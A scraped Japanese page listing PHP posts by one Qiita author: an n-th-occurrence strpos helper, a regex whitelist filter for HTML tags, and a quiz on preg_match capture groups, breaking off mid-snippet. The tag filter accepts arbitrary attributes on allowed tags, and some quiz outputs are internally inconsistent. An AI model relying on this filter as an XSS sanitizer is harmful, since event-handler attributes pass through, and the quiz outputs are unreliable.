    <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$needle</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$n</span><span class="o">--</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$needle</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$offset</span> <span class="o">=</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="nv">$len</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$pos</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">var_dump</span><span class="p">(</span><span class="nx">strpos_n</span><span class="p">(</span><span class="s1">'He has a pencil that has a eraser on the top.'</span><span class="p">,</span> <span class="s1">'has'</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span> <span class="c1">// int(21)</span>
</pre></div></div>

<p>そのまま置換をしたい場合は <a href="http://php.net/manual/ja/function.substr-replace.php" rel="nofollow noopener" target="_blank">substr_replace()</a> に結果を渡してください。</p>

<h4>
<span id="マルチバイト対応版" class="fragment"></span><a href="#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%90%E3%82%A4%E3%83%88%E5%AF%BE%E5%BF%9C%E7%89%88"><i class="fa fa-link"></i></a>マルチバイト対応版</h4>

<p>バイトオフセットの代わりに文字オフセットで返します。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">mb_strpos_n</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$needle</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$encoding</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">func_num_args</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$encoding</span> <span class="o">=</span> <span class="nb">mb_internal_encoding</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="nv">$offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$needle</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$n</span><span class="o">--</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">=</span> <span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$needle</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">,</span> <span class="nv">$encoding</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$offset</span> <span class="o">=</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="nv">$len</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$pos</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<h1>
<span id="preg_match_all-を使う" class="fragment"></span><a href="#preg_match_all-%E3%82%92%E4%BD%BF%E3%81%86"><i class="fa fa-link"></i></a><code>preg_match_all()</code> を使う</h1>

<p><a href="http://php.net/manual/ja/function.preg-match-all.php" rel="nofollow noopener" target="_blank">preg_match_all()</a> のオプション <strong><code>PREG_OFFSET_CAPTURE</code></strong> を利用した手法です。<br>
回数が増えてきたりするとこちらの方が速いと思われます。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">strpos_n</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$needle</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nb">preg_quote</span><span class="p">(</span><span class="nv">$needle</span><span class="p">,</span> <span class="s1">'/'</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'/'</span><span class="p">;</span>
    <span class="k">return</span>
        <span class="nb">preg_match_all</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$str</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">,</span> <span class="nx">PREG_OFFSET_CAPTURE</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nv">$n</span> <span class="o">?</span>
        <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$n</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">:</span>
        <span class="k">false</span>
    <span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>こちらはマルチバイトに対応できません。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />77位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>3</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/341de68b47082cd72145">特定のHTMLタグのみ表示を許可する</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-13 00:18:50</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h2>
<span id="例" class="fragment"></span><a href="#%E4%BE%8B"><i class="fa fa-link"></i></a>例</h2>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="err">&lt;</span>&gt;<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://hogehoge.com/&gt;&lt;&gt;&lt;"</span><span class="p">&gt;&lt;</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">b</span> <span class="na">myattr</span><span class="o">=</span><span class="s">"&lt;&gt;&lt;&gt;"</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;</span><span class="nt">i</span><span class="p">&gt;</span>hoge<span class="p">&lt;</span><span class="nt">ins</span><span class="p">&gt;</span>hoge<span class="p">&lt;/</span><span class="nt">ins</span><span class="p">&gt;&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="err">&lt;</span><span class="na">b</span><span class="err">&lt;</span><span class="na">b</span><span class="p">&gt;</span>&gt;&gt;
</pre></div></div>

<p>に対して、タグ <strong>a</strong>, <strong>b</strong>, <strong>i</strong> を許可する</p>

<h1>
<span id="case1-tidyが使えない場合" class="fragment"></span><a href="#case1-tidy%E3%81%8C%E4%BD%BF%E3%81%88%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>CASE1: Tidyが使えない場合</h1>

<p><strong>※ タグの入れ子が正しいかどうかを考慮していません</strong></p>

<h2>
<span id="htmlエンティティに置換する場合" class="fragment"></span><a href="#html%E3%82%A8%E3%83%B3%E3%83%86%E3%82%A3%E3%83%86%E3%82%A3%E3%81%AB%E7%BD%AE%E6%8F%9B%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>HTMLエンティティに置換する場合</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">filter_text</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$allow_tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>

    <span class="nv">$tags</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$allow_tags</span><span class="p">);</span>
    <span class="nv">$attr</span> <span class="o">=</span> <span class="s1">'(?: ++[\\w-]++(?:=(?:[\\w-]++|"[^"]*+"|\'[^\']*+\'))?+)'</span><span class="p">;</span>
    <span class="nv">$keep</span> <span class="o">=</span> <span class="nv">$tags</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span>
        <span class="s2">"&lt;/(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">) *+&gt;|&lt;(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">)</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|"</span><span class="o">:</span>
        <span class="s1">''</span>
    <span class="p">;</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"@</span><span class="si">{</span><span class="nv">$keep</span><span class="si">}</span><span class="s2">(&lt;)|(&gt;)@i"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">'&amp;gt;'</span><span class="p">;</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">'&amp;lt;'</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>                 <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="nv">$text</span><span class="p">);</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span><span class="ni">&amp;lt;&amp;gt;</span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://hogehoge.com/&gt;&lt;&gt;&lt;"</span><span class="p">&gt;&lt;</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">b</span> <span class="na">myattr</span><span class="o">=</span><span class="s">"&lt;&gt;&lt;&gt;"</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;</span><span class="nt">i</span><span class="p">&gt;</span>hoge<span class="ni">&amp;lt;</span>ins<span class="ni">&amp;gt;</span>hoge<span class="ni">&amp;lt;</span>/ins<span class="ni">&amp;gt;</span><span class="p">&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">B</span><span class="p">&gt;</span><span class="ni">&amp;lt;</span>b<span class="ni">&amp;lt;</span>b<span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span><span class="ni">&amp;gt;&amp;gt;</span>
</pre></div>
</div>

<h2>
<span id="削除する場合" class="fragment"></span><a href="#%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>削除する場合</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">filter_text</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$allow_tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>

    <span class="nv">$tags</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$allow_tags</span><span class="p">);</span>
    <span class="nv">$attr</span> <span class="o">=</span> <span class="s1">'(?: ++[\\w-]++(?:=(?:[\\w-]++|"[^"]*+"|\'[^\']*+\'))?+)'</span><span class="p">;</span>
    <span class="nv">$keep</span> <span class="o">=</span> <span class="nv">$tags</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span>
        <span class="s2">"&lt;/(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">) *+&gt;|&lt;(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">)</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|"</span><span class="o">:</span>
        <span class="s1">''</span>
    <span class="p">;</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"@</span><span class="si">{</span><span class="nv">$keep</span><span class="si">}</span><span class="s2">(&lt;/[</span><span class="se">\\</span><span class="s2">w-]++ *+&gt;|&lt;[</span><span class="se">\\</span><span class="s2">w-]++</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|&lt;[^&lt;&gt;]*+&gt;|[&lt;&gt;])@i"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>                 <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="nv">$text</span><span class="p">);</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://hogehoge.com/&gt;&lt;&gt;&lt;"</span><span class="p">&gt;&lt;</span><span class="nt">B</span><span class="p">&gt;&lt;</span><span class="nt">b</span> <span class="na">myattr</span><span class="o">=</span><span class="s">"&lt;&gt;&lt;&gt;"</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;</span><span class="nt">i</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">B</span><span class="p">&gt;</span>bb<span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>
</pre></div>
</div>

<h1>
<span id="case2-tidyが使える場合" class="fragment"></span><a href="#case2-tidy%E3%81%8C%E4%BD%BF%E3%81%88%E3%82%8B%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>CASE2: Tidyが使える場合</h1>

<p><code>php_tidy.dll</code> は php.ini の設定で有効化することが出来ます。<br>
Tidyを使えば、不足している閉じタグを適切に補正してくれます。<br>
また、存在しない属性もカットしてくれます。<br>
ついでにhref属性内の未エンコード文字を自動的にURLエンコードしてくれます。</p>

<h2>
<span id="htmlエンティティに置換する場合-1" class="fragment"></span><a href="#html%E3%82%A8%E3%83%B3%E3%83%86%E3%82%A3%E3%83%86%E3%82%A3%E3%81%AB%E7%BD%AE%E6%8F%9B%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88-1"><i class="fa fa-link"></i></a>HTMLエンティティに置換する場合</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">filter_text</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$allow_tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>

    <span class="nv">$tags</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$allow_tags</span><span class="p">);</span>
    <span class="nv">$attr</span> <span class="o">=</span> <span class="s1">'(?: ++[\\w-]++(?:=(?:[\\w-]++|"[^"]*+"|\'[^\']*+\'))?+)'</span><span class="p">;</span>
    <span class="nv">$keep</span> <span class="o">=</span> <span class="nv">$tags</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span>
        <span class="s2">"&lt;/(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">) *+&gt;|&lt;(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">)</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|"</span><span class="o">:</span>
        <span class="s1">''</span>
    <span class="p">;</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"@</span><span class="si">{</span><span class="nv">$keep</span><span class="si">}</span><span class="s2">(&lt;)|(&gt;)@i"</span><span class="p">;</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">'&amp;gt;'</span><span class="p">;</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">'&amp;lt;'</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>                 <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="nv">$text</span><span class="p">);</span>
    <span class="nv">$tidy</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Tidy</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$tidy</span><span class="o">-&gt;</span><span class="na">repairString</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'wrap'</span>           <span class="o">=&gt;</span> <span class="mi">0</span>    <span class="p">,</span>
        <span class="s1">'show-body-only'</span> <span class="o">=&gt;</span> <span class="k">true</span> <span class="p">,</span>
    <span class="p">),</span> <span class="s1">'utf8'</span><span class="p">);</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span><span class="ni">&amp;lt;&amp;gt;</span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://hogehoge.com/%3E%3C%3E%3C"</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;</span><span class="nt">i</span><span class="p">&gt;</span>hoge<span class="ni">&amp;lt;</span>ins<span class="ni">&amp;gt;</span>hoge<span class="ni">&amp;lt;</span>/ins<span class="ni">&amp;gt;</span><span class="p">&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">b</span><span class="p">&gt;</span><span class="ni">&amp;lt;</span>b<span class="ni">&amp;lt;</span>b<span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span><span class="ni">&amp;gt;&amp;gt;</span><span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>

<h2>
<span id="削除する場合-1" class="fragment"></span><a href="#%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8B%E5%A0%B4%E5%90%88-1"><i class="fa fa-link"></i></a>削除する場合</h2>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">コード</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">filter_text</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="nv">$allow_tags</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>

    <span class="nv">$tags</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'|'</span><span class="p">,</span> <span class="nv">$allow_tags</span><span class="p">);</span>
    <span class="nv">$attr</span> <span class="o">=</span> <span class="s1">'(?: ++[\\w-]++(?:=(?:[\\w-]++|"[^"]*+"|\'[^\']*+\'))?+)'</span><span class="p">;</span>
    <span class="nv">$keep</span> <span class="o">=</span> <span class="nv">$tags</span> <span class="o">!==</span> <span class="s1">''</span> <span class="o">?</span>
        <span class="s2">"&lt;/(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">) *+&gt;|&lt;(?:</span><span class="si">{</span><span class="nv">$tags</span><span class="si">}</span><span class="s2">)</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|"</span><span class="o">:</span>
        <span class="s1">''</span>
    <span class="p">;</span>
    <span class="nv">$pattern</span> <span class="o">=</span> <span class="s2">"@</span><span class="si">{</span><span class="nv">$keep</span><span class="si">}</span><span class="s2">(&lt;/[</span><span class="se">\\</span><span class="s2">w-]++ *+&gt;|&lt;[</span><span class="se">\\</span><span class="s2">w-]++</span><span class="si">{</span><span class="nv">$attr</span><span class="si">}</span><span class="s2">*+ *+/? *+&gt;|&lt;[^&lt;&gt;]*+&gt;|[&lt;&gt;])@i"</span><span class="p">;</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">case</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">:</span> <span class="k">return</span> <span class="s1">''</span><span class="p">;</span>
            <span class="k">default</span><span class="o">:</span>                 <span class="k">return</span> <span class="nv">$matches</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">},</span> <span class="nv">$text</span><span class="p">);</span>
    <span class="nv">$tidy</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Tidy</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$tidy</span><span class="o">-&gt;</span><span class="na">repairString</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'wrap'</span>           <span class="o">=&gt;</span> <span class="mi">0</span>    <span class="p">,</span>
        <span class="s1">'show-body-only'</span> <span class="o">=&gt;</span> <span class="k">true</span> <span class="p">,</span>
    <span class="p">),</span> <span class="s1">'utf8'</span><span class="p">);</span>

<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="html">
<div class="code-lang"><span class="bold">結果</span></div>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"http://hogehoge.com/%3E%3C%3E%3C"</span><span class="p">&gt;&lt;</span><span class="nt">b</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;</span><span class="nt">i</span><span class="p">&gt;</span>hogehoge<span class="p">&lt;/</span><span class="nt">i</span><span class="p">&gt;&lt;/</span><span class="nt">b</span><span class="p">&gt;</span>bb<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />78位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>2</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/ebfb374d89c2f09a918c">PCRE関数での$matchesの扱いについて</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-07-13 02:11:07</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>正規表現に関する問題です。<br>
次の出力結果を答えてください。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(?:(a)|(b)|(c))$/'</span><span class="p">,</span> <span class="s1">'b'</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$matches</span><span class="p">);</span>
</pre></div></div>

<p>※ パターン <strong>(?:　　)</strong> を使うと、$matchesに代入されないグループを作成することが出来ます。</p>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">1</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  string(0) ""
  [1]=&gt;
  string(1) "b"
  [2]=&gt;
  string(0) ""
}
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">2</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  string(1) "b"
  [1]=&gt;
  string(0) ""
  [2]=&gt;
  string(1) "b"
  [3]=&gt;
  string(0) ""
}
</pre></div>
</div>

<div class="code-frame" data-lang="text">
<div class="code-lang"><span class="bold">3</span></div>
<div class="highlight"><pre><span></span>array(3) {
  [0]=&gt;
  string(0) "b"
  [1]=&gt;
  string(1) ""
  [2]=&gt;
  string(0) "b"
}
</pre></div>
</div>

<p>（回答は↓）　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
まあ <strong>1</strong> は「違う」って多くの人が納得されると思います。<br>
そうです、 <code>$matches[0]</code> は <strong>パターン全体</strong> を表すからです。<br>
今回の場合、<br>
a → <code>$matches[1]</code><br>
b → <code>$matches[2]</code><br>
c → <code>$matches[3]</code><br>
となります。</p>

<p>残ってくる選択肢が <strong>2</strong> と <strong>3</strong> 。<br>
さて正解は？<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　<br>
　</p>

<p>実は <strong>3</strong> なんです。<br>
「b」がマッチした時点で <strong>(?:(a)|(b)|(c))</strong> 内の評価が終わり、3番目の <strong>(c)</strong> のキャプチャは作成されない、という理由です。（意外と目から鱗だった方もいらっしゃるのではないでしょうか？）<br>
　　<br>
この仕様を知っておけば、こういう処理も楽々1回の正規表現で書けちゃいますね。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">フィーチャーフォンのキャリア判定</span></div>
<div class="highlight"><pre><span></span><span class="nv">$agent</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">])</span> <span class="o">?</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$pattern</span> <span class="o">=</span> <span class="s1">'@'</span><span class="o">.</span>
    <span class="s1">'^DoCoMo/[12]\\.0|'</span><span class="o">.</span>
    <span class="s1">'(^(?:J-PHONE|Vodafone|MOT-[CV]980|SoftBank)/)|'</span><span class="o">.</span>
    <span class="s1">'(^KDDI-|UP\\.Browser/)|'</span><span class="o">.</span>
    <span class="s1">'(^PDXGW|DDIPOCKET;|WILLCOM;)'</span><span class="o">.</span>
<span class="s1">'@'</span><span class="p">;</span>
<span class="k">switch</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="nv">$agent</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">)</span><span class="o">:</span>
